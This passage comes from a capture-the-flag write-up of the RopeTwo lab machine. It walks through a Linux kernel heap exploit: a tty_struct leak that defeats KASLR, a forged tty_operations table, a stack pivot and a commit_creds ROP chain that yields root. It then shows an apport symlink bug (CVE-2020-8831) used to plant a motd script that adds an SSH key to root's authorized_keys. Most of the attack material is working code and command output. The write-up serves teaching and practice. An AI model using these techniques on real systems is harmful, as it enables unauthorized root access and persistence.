        // Loop over buffers, create, open ptmx, check for tty_struct
        for(i=0; i < 0x20; i++){
            create_buf(i, 0x400);
            ptmx = open("/dev/ptmx", O_RDWR | O_NOCTTY);

            read_buf(i, 0x420, output);
            if((output[0x400/8] & 0xffffffff) == 0x5401 &&
               (output[0x418/8] & 0xfff) == 0x6a0) {
                break;
            }
            close(ptmx);
        }

        if (i == 0x20){
            printf("[-] Failed to find tty_struct. Try again.\n");
        } else {
            uint64_t ptm_unix98_ops = output[0x418/8];
            printf("[+] Identified ptm_unix98_ops address: %016lx\n", ptm_unix98_ops);
            kernel_base = ptm_unix98_ops - 0x10af6a0;
            printf("[+] Identified kernel base address:    %016lx\n", kernel_base);
            id = i;
        }
    }
}

```

It works:

```

oxdf@ropetest:~$ ./exploit
[-] Failed to find tty_struct. Try again.
[-] Failed to find tty_struct. Try again.
[+] Identified ptm_unix98_ops address: ffffffff95aaf6a0
[+] Identified kernel base address:    ffffffff94a00000

```

### Control RIP

#### Strategy

Now that I can defeat KASLR, I’ll try to control RIP. To do that, I’m going to continue to abuse this `tty_struct`, specially the `tty_operations` struct that I used to get a leak. This struct has [the follow](https://github.com/torvalds/linux/blob/master/include/linux/tty_driver.h) structure:

```

struct tty_operations {
	struct tty_struct * (*lookup)(struct tty_driver *driver,
			struct file *filp, int idx);
	int  (*install)(struct tty_driver *driver, struct tty_struct *tty);
	void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
	int  (*open)(struct tty_struct * tty, struct file * filp);
	void (*close)(struct tty_struct * tty, struct file * filp);
	void (*shutdown)(struct tty_struct *tty);
	void (*cleanup)(struct tty_struct *tty);
	int  (*write)(struct tty_struct * tty,
		      const unsigned char *buf, int count);
...[snip]...

```

It contains a bunch of pointers to functions to be called for various operations. So when `close` is called on the handle for the device, the close operation is looked up in this struct. Therefore, if I can control this, I can control RIP.

#### Implementation

I currently have control over a pointer to a `tty_operations` struct. I’ll create a new one, and then overwrite that pointer with my own. The only function I’m going to worry about is `close()` as I’ll just close the handle to the TTY immediately after inserting my bogus `tty_operations`.

```

    uint64_t *fake_tty_ops = malloc(248);
    fake_tty_ops[4] = 0xdfdfdfdfdfdfdfdf;
    output[0x418/8] = (uint64_t)fake_tty_ops;
    write_buf(id, 0x420, output);
    close(ptmx);

```

This will cause the system to crash, because RIP is now 0xdfdfdfdfdfdfdfdf.

### ROP

#### Stack Pivot

With control over RIP, I’ll need to run something. When I think of a typical ROP, there’s a return address on the stack that’s overwritten, and then the ROP can continue right after that. In this case, the overwrite is a pointer in the `tty_operations` struct, so I can’t just keep writing there, as that’s not the stack. That leads to the concept of a [stack pivot](https://failingsilently.wordpress.com/2018/04/17/what-is-a-stack-pivot/), which is using a single gadget to move the stack to a new address where I have or will write the rop chain attack. I can move the stack over to a memory space I control, and set up a ROP chain there.

Because I’m looking for gadgets across the entire kernel, there will be a ton of them. I’ll use [ROPGadget](https://github.com/JonathanSalwan/ROPgadget) to dump them all into a file (which will take a minute), and then I can search it from there.

```

root@kali# python3 /opt/ROPgadget/ROPgadget.py --binary vmlinux-5.0.0-38-generic > gadgets 
root@kali# wc -l gadgets 
811057 gadgets

```

I can see in the crash that my overwrite over `close()` ends up in both RIP and RAX. So while it would be difficult to get something onto the stack to pop into RSP, an `xchg rsp, rax` would put the stack at an address I know. And because the code is running in the kernel, I have a fair amount of flexibility here to change permissions and overwrite things.

Using `grep` to look for `xchg` with RSP and RAX didn’t find anything.

```

root@kali# grep -E -e 'xchg rsp, rax ; ret' -e 'xchg rax, rsp ; ret' gadgets

```

But because I can predict the top 32-bits of the word, EAX and ESP works just as well, and there’s lots of those:

```

root@kali# grep -E -e ': xchg esp, eax ; ret' -e ': xchg eax, esp ; ret' gadgets | wc -l
228

```

Because I’m going to make this the stack pointer, I need the address of the gadget to be on an 8-bit boundary. Still plenty:

```

root@kali# grep -E -e ': xchg esp, eax ; ret' -e ': xchg eax, esp ; ret' gadgets | grep -E "^0x[0-9a-f]{15}[08]" | wc -l
38
root@kali# grep -E -e ': xchg esp, eax ; ret' -e ': xchg eax, esp ; ret' gadgets | grep -E "^0x[0-9a-f]{15}[08]" | head
0xffffffff81368c08 : xchg eax, esp ; ret 0
0xffffffff817fccd8 : xchg eax, esp ; ret 0x166
0xffffffff81610650 : xchg eax, esp ; ret 0x2241
0xffffffff81076088 : xchg eax, esp ; ret 0x35e9
0xffffffff81288d78 : xchg eax, esp ; ret 0x3948
0xffffffff8114bb88 : xchg eax, esp ; ret 0x394d
0xffffffff812f74c0 : xchg eax, esp ; ret 0x3d
0xffffffff828deb28 : xchg eax, esp ; ret 0x43
0xffffffff814afc90 : xchg eax, esp ; ret 0x69e9
0xffffffff8154b090 : xchg eax, esp ; ret 0x8148

```

I’ll grab the first one, and now the code looks like:

```

    // Stack Pivot
    size_t xchg_esp_eax = 0x368c08 + kernel_base;
    uint64_t *fake_tty_ops = malloc(248);
    fake_tty_ops[4] = xchg_esp_eax;
    output[0x83] = (uint64_t)fake_tty_ops;
    write_buf(id, 0x420, output);
    uint64_t new_stack = xchg_esp_eax & 0xffffffff;

    // Set Permissions

    // Offsets

    // ROP

    // trigger ROP
    close(ptmx);

```

The `xchg` instruction with 32-bit arguments will 0 out the rest of the 64-bit register. So the new stack won’t be on top of the `xchg` instruction, but at the same place but with nulls in the first 32-bits.

#### Permissions

From the kernel I have a lot of control, but the memory needs to be both writable and executable, so I’ll call to `mmap`. The call needs to be on a page boundary, so I’ll set the last three nibbles to 0, and pick a large enough size that the ROP has no worries about space. The [docs](https://man7.org/linux/man-pages/man2/mmap.2.html) show the flags here, and I’ll select `MAP_PRIVATE` because I want this change to only impact this process, `MAP_ANONYMOUS` because I’m working with shellcode here, and `MAP_FIXED` because I want the address to be forced. With `MAP_ANONYMOUS`, the `fd` parameter should be `-1`, and there’s no offset:

```

    // Set Permissions
    mmap((void *)(new_stack & 0xfffff000), 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC,
        MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);

    // Offsets

    // ROP

    // trigger ROP
    close(ptmx);

```

#### ROP

The ROP itself will use a technique with `prepare_kernel_cred(0)` passed to `commit_creds` to set the current process to root. Then return to user space and spawn a shell using `swapgs` and a function with a shell.

I’ll define the offsets I need to use (not shown), and then go to the ROP. To start, I’ll return (always good to start a ROP with a `ret` gadget), and then call `prepare_kernel_cred(0)`:

```

    // ROP
    uint64_t *st_ptr = new_stack;
    int st_idx = 0;
    st_ptr[st_idx++] = ret;
    st_ptr[st_idx++] = pop_rdi;
    st_ptr[st_idx++] = 0;
    st_ptr[st_idx++] = prepare_kernel_cred;

```

On returning, the result will be in RAX, and I’ll need a way to get it into RDI. The `mov rdi, rdx` gadgets aren’t pretty:

```

root@kali# grep ': mov rdi, rax' gadgets | grep -v -e call -e 'jmp 0x'
0xffffffff8112e597 : mov rdi, rax ; cmp r8, rdx ; jne 0xffffffff8112e57c ; pop rbp ; ret
0xffffffff814ed7ea : mov rdi, rax ; cmp rcx, rsi ; ja 0xffffffff814ed7dd ; pop rbp ; ret
0xffffffff814ed84c : mov rdi, rax ; cmp rcx, rsi ; ja 0xffffffff814ed83d ; pop rbp ; ret
0xffffffff8102f7ff : mov rdi, rax ; rep movsq qword ptr [rdi], qword ptr [rsi] ; pop rbp ; ret
0xffffffff828f29f4 : mov rdi, rax ; xor eax, eax ; rep movsb byte ptr [rdi], byte ptr [rsi] ; ret

root@kali# grep ': pop r8 ; ret' gadgets | head -1
0xffffffff814875b2 : pop r8 ; ret
root@kali# grep ': pop rdx ; ret' gadgets | head -1
0xffffffff8103bbc2 : pop rdx ; ret

```

Looking at the first one in that list, as long as R8 equals RDX, it will skip the jump, pop RBP, and return. I can manage that:

```

    st_ptr[st_idx++] = pop_r8;
    st_ptr[st_idx++] = 0;
    st_ptr[st_idx++] = pop_rdx;
    st_ptr[st_idx++] = 0;
    st_ptr[st_idx++] = mov_rax_rdi_cmp_pop_rbp;
    st_ptr[st_idx++] = 0;
    st_ptr[st_idx++] = commit_creds;

```

The code will put 0 into both R8 and RDX, then call the gadget to move the return from RAX to RDI, and then the last 0 if for the RBP pop. Then, with RDI containing the return from `prepare_kernel_cred`, it calls `commit_creds`.

Now that the creds are in place, I’ll need code to get back into userland. First, `swapgs` will [swap the kernel GS base register with the value it needs to run in user space](https://www.felixcloutier.com/x86/swapgs). There’s a gadget with `swapgs` followed by `pop rbp` that’ll work:

```

    st_ptr[st_idx++] = swapgs_pop_rbp;
    st_ptr[st_idx++] = 0;

```

Then the `sysretq` instruction will return to useland. This is typically used to [return from a SYSCALL](http://www.ijack.org.uk/syscalls.html). I’ll need the return address in RCX, and the flags set in R11. I’ll write a short function I want to jump to as root:

```

void shell() {
    if(!getuid()) {
        system("/bin/sh");
    } else {
        puts("[-] Failed");
        exit(-1);
    }
}

```

It doesn’t seem to matter what’s in R11, so I’ll use 0.

```

    st_ptr[st_idx++] = pop_rcx;
    st_ptr[st_idx++] = &shell;
    st_ptr[st_idx++] = pop_r11;
    st_ptr[st_idx++] = 0x0;
    st_ptr[st_idx++] = sysretq;

```

#### Trigger

Now all that’s left to do is trigger the ROP by closing the handle to `/dev/ptmx`. This should lead to `/bin/sh` running in this process, but if it fails, I’ll print a message and return 1:

```

    // trigger ROP
    printf("[*] Triggering ROP\n");
    close(ptmx);
    printf("[-] Exploit failed.\n");
    return 1;

```

### Shell

The full source is [here](/files/ropetwo-pwn-ralloc.c). With all the pieces, I’ll compile and upload it to RopeTwo:

```

root@kali# gcc -w -o exploit exploit.c ; scp -i ~/keys/ed25519_gen exploit r4j@10.10.10.196:/tmp/df
exploit                        100%   17KB 532.3KB/s   00:00 

```

It will fail much of the time, but running it a couple times seems to result in a shell:

```

r4j@rope2:~$ /tmp/df
[+] Identified ptm_unix98_ops address: ffffffff908af6a0
[+] Identified kernel base address:    ffffffff8f800000
[*] Using slot 5
[*] Triggering ROP
[-] Exploit failed.
r4j@rope2:~$ /tmp/df
[+] Identified ptm_unix98_ops address: ffffffff908af6a0
[+] Identified kernel base address:    ffffffff8f800000
[*] Using slot 25
[*] Triggering ROP
# id
uid=0(root) gid=0(root) groups=0(root)

```

From there I can grab the flag:

```

# bash
root@rope2:~# cat /root/root.txt
7430266b************************

```

## Beyond Root - Unintended

### Find Bug

The first team to solve this box used an unintended path that was quickly patched by the HTB team. The bug they identified allowed them to go from chromeuser to root in one exploit. One of the members of that team, jkr, helped me recreate the bug.

This box was released on 27 June 2020. In the `apt` logs, there’s a removal of `apport` two days later on 29 June:

```

root@rope2:/var/log/apt# zcat history.log.1.gz 

Start-Date: 2020-06-03  12:00:07
Commandline: apt install ifupdown
Install: ifupdown:amd64 (0.8.35ubuntu1)
End-Date: 2020-06-03  12:00:09

Start-Date: 2020-06-29  18:40:31
Commandline: apt purge apport
Purge: apport:amd64 (2.20.10-0ubuntu27.3)
End-Date: 2020-06-29  18:40:33

```

The version removed was 2.20.10-0ubuntu27.3. Some Googling reveals [CVE-2020-8831](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8831). As root on RopeTwo, I can reconfigure the box to be vulnerable to this path again.

### Install Old apport

`apport` is a program designed to [intercept crashes and record information](https://wiki.ubuntu.com/Apport) so that debugging / troubleshooting can occur without having to recreate the crash itself.

To install this older vulnerable version of `apport`, I will use `apt`. I needed to first fix the sources file:

```

root@rope2:~# cat /etc/apt/sources.list
deb http://old-releases.ubuntu.com/ubuntu disco main universe multiverse restricted
deb http://old-releases.ubuntu.com/ubuntu disco-updates main universe multiverse restricted

```

Because the RopeTwo machine can’t talk directly to the internet, I’ll proxy `apt` through my Burp instance. I changed Burp on my local machine so that it listened on all interfaces, and not just localhost:

![image-20210115132619998](https://0xdfimages.gitlab.io/img/image-20210115132619998.png)

I’ll also set the `http_proxy` environment variable to tell `apt` to use this proxy:

```

root@rope2:~# export http_proxy=http://10.10.14.14:8080

```

Now I’ll just run `apt update` and then `apt install apport=2.20.10-0ubuntu27.3`.

### Exploit

#### Background

The exploit here takes advantage of how `apport` writes to the `/var/lock` directory. The directory is writable by any user:

```

chromeuser@rope2:~$ ls -ld /var/lock/
drwxrwxrwt 4 root root 80 Jan 15 16:27 /var/lock/

```

`apport` will create a directory `apport` in that folder with a file, `lock`, when something segfaults. The vulnerability is in how it handles symlinks. I’ll create a link pointing `/var/lock/apport` to a directory I want to write in, like `/etc/update-motd.d` (I’ve shown exploiting writing to this directory before in [Traceback](/2020/08/15/htb-traceback.html#priv-sysadmin--root)). If I can get a file in that folder that I can write to, and then log in with ssh or su, then it will run as root.

#### Practice

As chromeuser on the box after re-installing `apport` as root, I’ll go into `/var/lock` . There is currently no `apport` directory:

```

chromeuser@rope2:/var/lock$ ls
lvm  subsys

```

I’ll create a symlink:

```

chromeuser@rope2:/var/lock$ ln -s /etc/update-motd.d apport
chromeuser@rope2:/var/lock$ ls -l
total 0
lrwxrwxrwx 1 chromeuser chromeuser 18 Jan 15 19:01 apport -> /etc/update-motd.d
drwx------ 2 root       root       40 Jan 15 18:52 lvm
drwxr-xr-x 2 root       root       40 Jan 15 18:52 subsys

```

Now I need to crash something. I could just run the heap exploit again, or kill something with a signal 11

```

chromeuser@rope2:/var/lock$ sleep 100000 &
[1] 3574
chromeuser@rope2:/var/lock$ kill -11 3574
[1]+  Segmentation fault      (core dumped) sleep 100000

```

This creates a new file in `/etc/update-motd.d`, the last one, `lock`:

```

chromeuser@rope2:/etc/update-motd.d$ ls -l
total 40
-rwxr-xr-x 1 root root 1220 Aug  6  2018 00-header
-rwxr-xr-x 1 root root 1157 Aug  6  2018 10-help-text
lrwxrwxrwx 1 root root   46 Apr 16  2019 50-landscape-sysinfo -> /usr/share/landscape/landscape-sysinfo.wrapper
-rwxr-xr-x 1 root root 4264 Aug 21  2018 50-motd-news
-rwxr-xr-x 1 root root   97 Apr  9  2018 90-updates-available
-rwxr-xr-x 1 root root  299 Aug 10  2018 91-release-upgrade
-rwxr-xr-x 1 root root  129 Apr  9  2018 95-hwe-eol
-rwxr-xr-x 1 root root  111 Nov 13  2018 97-overlayroot
-rwxr-xr-x 1 root root  142 Apr  9  2018 98-fsck-at-reboot
-rwxr-xr-x 1 root root  144 Apr  9  2018 98-reboot-required
-rwxrwxrwx 1 root root    0 Jan 15 19:02 lock

```

Notice that it’s world writable.

I already have my public key in `/home/chromeuser/.ssh/authorized_keys`. I’ll just use this as a Bash script to copy that into `/root/.ssh/authorized_keys`:

```

#!/bin/bash

echo "pwned!"
mkdir /root/.ssh
cat /home/chromeuser/.ssh/authorized_keys >> /root/.ssh/authorized_keys

```

Now I’ll SSH in as chromeuser again to trigger the MOTD script:

```

root@kali# ssh -i ~/keys/ed25519_gen chromeuser@10.10.10.196
Welcome to Ubuntu 19.04 (GNU/Linux 5.0.0-38-generic x86_64)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Jan 15 19:07:21 UTC 2021

  System load:  0.31               Processes:             317
  Usage of /:   41.7% of 19.56GB   Users logged in:       3
  Memory usage: 29%                IP address for ens160: 10.10.10.196
  Swap usage:   0%

71 updates can be installed immediately.
0 of these updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release. Check your Internet connection or proxy settings

pwned!
Last login: Fri Jan 15 19:05:14 2021 from 10.10.14.14
chromeuser@rope2:~$

```

The fact that it says “pwned!” just above the prompt shows that my exploit ran. I can SSH as root:

```

root@kali# ssh -i ~/keys/ed25519_gen root@10.10.10.196
Welcome to Ubuntu 19.04 (GNU/Linux 5.0.0-38-generic x86_64)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Jan 15 19:08:09 UTC 2021

  System load:  0.26               Processes:             322
  Usage of /:   41.7% of 19.56GB   Users logged in:       3
  Memory usage: 29%                IP address for ens160: 10.10.10.196
  Swap usage:   0%

71 updates can be installed immediately.
0 of these updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release. Check your Internet connection or proxy settings

pwned!
Last login: Fri Jan 15 19:05:25 2021 from 10.10.14.14
root@rope2:~#

```